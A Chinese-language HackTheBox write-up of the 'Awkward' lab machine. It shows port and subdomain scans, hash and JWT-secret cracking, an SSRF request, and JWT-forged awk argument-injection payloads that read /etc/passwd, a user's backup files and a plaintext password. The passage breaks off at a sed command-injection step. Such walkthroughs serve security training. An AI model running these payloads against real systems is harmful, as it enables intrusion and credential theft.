---
title: Awkward - HackTheBox
url: https://darkwing.moe/2022/10/30/Awkward-HackTheBox/
source: 喵喵喵喵
date: 2022-10-31
fetch_date: 2025-10-03T21:20:35.555676
---

# Awkward - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Awkward - HackTheBox

# Awkward - HackTheBox

##### 2022-10-30

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.185](#10-10-11-185)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
   2. [2.2. app.js](#app-js)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. hr to dashboard](#hr-to-dashboard)
   2. [3.2. staff-details](#staff-details)
   3. [3.3. hr again](#hr-again)
   4. [3.4. store-status SSRF](#store-status-SSRF)
   5. [3.5. awk 参数注入](#awk-参数注入)
4. [4. LFI](#LFI)
   1. [4.1. /home/bean/.bashrc](#home-bean-bashrc)
   2. [4.2. /home/bean/Documents/backup\_home.sh](#home-bean-Documents-backup-home-sh)
   3. [4.3. bean\_backup\_final.tar.gz](#bean-backup-final-tar-gz)
5. [5. user flag](#user-flag)
6. [6. store](#store)
   1. [6.1. cart\_actions.php](#cart-actions-php)
7. [7. www-data shell](#www-data-shell)
8. [8. 提权信息](#提权信息)
9. [9. 提权 & root flag](#提权-amp-root-flag)
   1. [9.1. shadow](#shadow)
10. [10. 参考资料](#参考资料)

# Awkward - HackTheBox

2022-10-30

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/503>
* ## 10.10.11.185

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102501.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.185 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 13:15 CST Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 13:16 (0:00:06 remaining) Nmap scan report for 10.10.11.185 Host is up (0.20s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA) |_  256 59365bba3c7821e326b37d23605aec38 (ED25519) 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.53 seconds ``` |

## 80

需要加hosts:

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.185 hat-valley.htb ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102502.jpg)

## app.js

/js/app.js中可以得到一些路由(也可以在后面的ssrf中得到)：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` var baseURL = "/api/"  /all-leave /submit-leave /login /staff-details  var routes = [{  path: "/",  name: "base",  component: _Base_vue__WEBPACK_IMPORTED_MODULE_3__["default"]}, {  path: "/hr",  name: "hr",  component: _HR_vue__WEBPACK_IMPORTED_MODULE_4__["default"]}, {  path: "/dashboard",  name: "dashboard",  component: _Dashboard_vue__WEBPACK_IMPORTED_MODULE_5__["default"],  meta: {    requiresAuth: true  }}, {  path: "/leave",  name: "leave",  component: _Leave_vue__WEBPACK_IMPORTED_MODULE_6__["default"],  meta: {    requiresAuth: true  }}]; ``` |

# 子域名扫描

子域名可以发现一个store：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://hat-valley.htb/" -H 'Host: FUZZ.hat-valley.htb' -fs 132  store                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 201ms] ``` |

需要登录：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102503.jpg)

#hat-valley.htb

## hr to dashboard

<http://hat-valley.htb/hr> 也是需要登录，默认cookie是guest，修改为其他任意，可以访问到dashboard：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102504.jpg)

## staff-details

staff-details api 未授权，得到一些用户名和密码hash，可以破解出来其中christopher.jones的密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` curl http://hat-valley.htb/api/staff-details | jq  "username": "christopher.jones", "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",      chris123 ``` |

## hr again

回到hr那里，得到的账号密码正常登录，得到有效JWT，JWT也可以破解出来密钥：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -d ~/Tools/dict/rockyou.txt -C  [+] 123beany123 is the CORRECT key! ``` |

## store-status SSRF

store-status那里可以SSRF，发现3002端口泄漏代码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` http://hat-valley.htb/api/store-status?url=%22http:%2F%2F127.0.0.1:3002%22 ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102505.jpg)

## awk 参数注入

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102511.jpg)

查看上面的代码，之前是有非预期命令注入的，现在已经修复了，预期方案是jwt伪造用户名，注入到awk中，达成任意文件读取效果：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {  python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv "/' /etc/passwd 'a" -p 123beany123 -S hs256 -I  "awk '/" + /' /etc/passwd 'a + "/' /var/www/private/leave_requests.csv"  "awk '/"/' /etc/passwd 'a"/' /var/www/private/leave_requests.csv" ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102506.jpg)

# LFI

一步步读取文件，得到bean用户的密码

## /home/bean/.bashrc

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv "/' /home/bean/.bashrc 'a" -p 123beany123 -S hs256 -I  # custom alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh' ``` |

## /home/bean/Documents/backup\_home.sh

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv "/' /home/bean/Documents/backup_home.sh 'a" -p 123beany123 -S hs256 -I  #!/bin/bash mkdir /home/bean/Documents/backup_tmp cd /home/bean tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz . date > /home/bean/Documents/backup_tmp/time.txt cd /home/bean/Documents/backup_tmp tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz . rm -r /home/bean/Documents/backup_tmp ``` |

## bean\_backup\_final.tar.gz

这个压缩包中的另一个压缩包，配置文件中得到bean的密码

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv "/' /home/bean/Documents/backup/bean_backup_final.tar.gz 'a" -p 123beany123 -S hs256 -I  bean.hill 014mrbeanrules!#P ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102507.jpg)

# user flag

bean ssh登录：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102508.jpg)

# store

store前面看是需要密码的，现在可以去读配置文件，破解不出来，但其实就是bean用户的密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` bean@awkward:/var/www/store$ cat /etc/nginx/conf.d/.htpasswd admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1  sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  014mrbeanrules!#P ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022102512.jpg)

结合代码中相关说明，现在没有使用数据库，使用本地文件进行相关处理

代码审计发现，cart\_actions.php中删除cart时调用sed，可以进行命令注入，但过滤了很多字符，不能直接使用gtfobins中常规利用方式：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!  system("sed...